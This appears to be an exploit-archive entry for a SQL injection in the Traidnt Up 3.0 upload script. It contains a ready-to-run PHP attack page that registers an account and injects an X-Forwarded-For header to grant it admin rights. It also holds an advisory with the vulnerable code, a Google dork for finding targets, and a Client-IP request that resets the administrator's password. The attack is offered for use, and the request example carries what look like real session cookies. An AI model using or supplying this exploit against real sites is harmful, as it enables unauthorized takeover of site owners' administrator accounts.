@@ -1,0 +1,131 @@
+id: 23312
+date: 02/18/2015
+title: Traidnt Up 3.0 SQL injection Exploit
+author: The Company
+cves: 
+
+<?php
+set_time_limit(0);
+
+ if(isset($_POST["target"]) and isset($_POST["user"]) and isset($_POST["email"]) and isset($_POST["pass"]) ) {
+$target = $_POST["target"];
+$user=$_POST["user"]  ;
+$email=$_POST["email"]    ;
+$pass=$_POST["pass"]    ;
+$regs = $target . "register.php";
+
+$post_r = "name=".$user."&email=".$email."&password=".$pass."&rules=NULL";
+source($regs, $post_r);
+
+
+$login = $target . "login.php?do=login";
+$post_l = "username=".$user."&password=".$pass;
+source($login, $post_l);
+
+
+$inj = array("X-Forwarded-For: 127.0.0.1' ,`group`='1");
+source($target, 0, $inj)    ;
+
+
+echo '<center><font size="4" color="#FF0000"><br /><br /><br /><br /><form action="'.$target.'admin/login.php" method="POST">
+<input name="username" type="hidden" value="'.$user.'" />
+<input name="password" type="hidden" value="'.$pass.'" />
+<input name="rem" type="hidden" value="TRUE" />
+<input type="submit" name="" value="Go To Cpanel" />
+</form>
+</font></center>';
+
+}else{
+  echo '
+<center><br /><br /><form action="" method="POST">
+http://site.com/path/&nbps;&nbps;:&nbps;<input name="target" type="text" value="" /><br /> <br />
+&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;user&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;:&nbps;&nbps;<input name="user" type="text" value="massacreur" />     <br />   <br />
+&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;email&nbps;&nbps;&nbps;&nbps;: &nbps;&nbps;<input name="email" type="text" value="webservers@hotmail.fr" />  <br />    <br />
+&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;&nbps;password&nbps;&nbps;&nbps;&nbps;&nbps;:&nbps;&nbps;<input name="pass" type="text" value="kShDk54SqJ4d" />   <br />  <br />
+<input type="submit" name="" value="Add Admin" /><br />
+</form></center>';
+
+}
+
+
+function source($url, $post = false, $inj = 0, $flw = 1, $timeout = 15, $cookies = 1) {
+  $curl = curl_init();
+  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+  curl_setopt($curl, CURLOPT_URL, $url);
+  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
+  curl_setopt($curl, CURLOPT_HEADER, 0);
+  if ($cookies == 1) {
+    curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd() . '/co.txt');
+    curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd() . '/co.txt');
+  }
+  if ($post) {
+    curl_setopt($curl, CURLOPT_POST, 1);
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
+  }
+  if (isset ($inj) and $inj != 0) {
+    curl_setopt($curl, CURLOPT_HTTPHEADER, $inj);
+  }
+  curl_setopt($curl, CURLOPT_USERAGENT, "Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
+  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, $flw);
+  curl_setopt($curl, CURLOPT_TIMEOUT, $timeout);
+  $exec = curl_exec($curl);
+  curl_close($curl);
+  return $exec;
+}
+?>
+
+# Exploit Title: Traidnt Up v3.0 SQL Injection
+# Google Dork: "Powered by TRAIDNT UP Version 3.0"
+# Date: 10-04-2015
+# Exploit Author: Ali Sami (ali.albakara@outlook.com)
+# Vendor Homepage: http://traidnt.net
+# Software Link: http://www.traidnt.net/vb/attachments/519880d1285278011-traidnt-up-v3.0.zip
+# Version: 3.0
+ 
+######### Vulnerable Code ############
+File: classUserdb.php
+    protected function doUpdateLastActive($username)
+    {
+ 
+        $this->_db->query("UPDATE `users` SET `lastactive` = '" . NOWTIME . "' WHERE `name` = '$username' LIMIT 1 ;");
+        $sql = "UPDATE `users` SET `lastip`        = '" . $this->getIpAddr() . "' WHERE `name` = '$username' LIMIT 1 ;";
+        echo $sql;
+        $this->_db->query($sql);
+ 
+    }
+ 
+    private function getIpAddr()
+    {
+        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+            $ip = $_SERVER['HTTP_CLIENT_IP'];
+        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+        } else {
+            $ip = $_SERVER['REMOTE_ADDR'];
+        }
+        return $ip;
+    }
+######################################
+ 
+########## Explanation ###############
+getIpAddr function prioritizes untrusted user input entry (HTTP_CLIENT_IP & HTTP_X_FORWARDED_FOR) over the trusted one (REMOTE_ADDR) and does not sanitization 
+######################################
+ 
+########## Proof-of-concept ##########
+1. Register an account at the upload center
+2. Send a request that consists of an extra header (CLIENT-IP) which must contain the intended SQL to cp.php
+#######################################
+ 
+########## Request Example ###########
+GET /up/cp.php HTTP/1.1
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: en-US,en;q=0.8,ar;q=0.6
+Cookie: PREF=ID=3a12b65d918b5ae2:U=45f515bf65b09574:FF=4:LD=en:TM=1427718041:LM=1428079570:GM=1:S=fKvs0s67_JroY23b; SID=DQAAABYBAAAXBPxKBeMSz09m3xCH23suPwacDFc9z5ZTI1ryFZK7qYLbSIB4zQXOmaYpafjcxlh6qaAHy-rPNZOPYjnLa-pW4Xly4-XIfNze1b1HCtrbf5Nm5pBrxOdoyeKsjg0-CvszxYHXgkzN7JcJc-1ujf4fHrEZNoSR9k_f2Qm7WX3mXd-8z_guk36_sve2sHN2_d7eeT_e5IQl43NcT5ID_YMNPXQPADss_k0kOraKLeZn7kUs3wox8ZanbvgMSM9O8lQ5oaP7CmtioaFpts1Aunqk43teWMS35YAP6_d9i65Sx32NJoCqGQpMs2pQiMvbxm10DlBixFJuwW1AitFrblnTUg06mgzqTzPLoPVJ_KlHRbeBys_VyJxnmUx1IrwQJzk; HSID=AQJUEVtf4qu2U_FTd; SSID=AN_8N-KoCnT18Clw5; APISID=IqdO-J-4tT4AtOR8/AQp8y6Nd19D86imDx; SAPISID=MMGr9eZKdxn4QieS/Ak36TdFaTbAMrcFGl; S=videobuying=MntGlNA3nRzvbhbjINLRMw; NID=67=TabAC6lMzTQywxlSyMcuCfGN3PSOxY0X3VV0jglmXfVhTEGrkhWyrhTxLDOUytsOKlLuRHJhAatM2tSk5BiAweIssYjppGFH3zGLklwMBFqMwZqlxEQANw-qJwh2Jri6G7fL68NA2PyDT6dPNc9iY_zPfNtQ4jQEHq0Rqio7vRYs_1aPsPWp_mzoWs9lZPps_dmCRWv76C6WvGdw8ZruV86ojr77-qIkjnpVQKAhH5aRDCTGNKFRZ5LIRZXOhw
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
+X-Client-Data: CJK2yQEIpbbJAQiptskB
+Client-IP: 127.0.0.1', name='admin', password=md5('123') WHERE id = 1--
+ 
+** This request will update the administrator's username to (admin) and password to (123)
+######################################
+
+#  0day.today [2023-03-21]  #
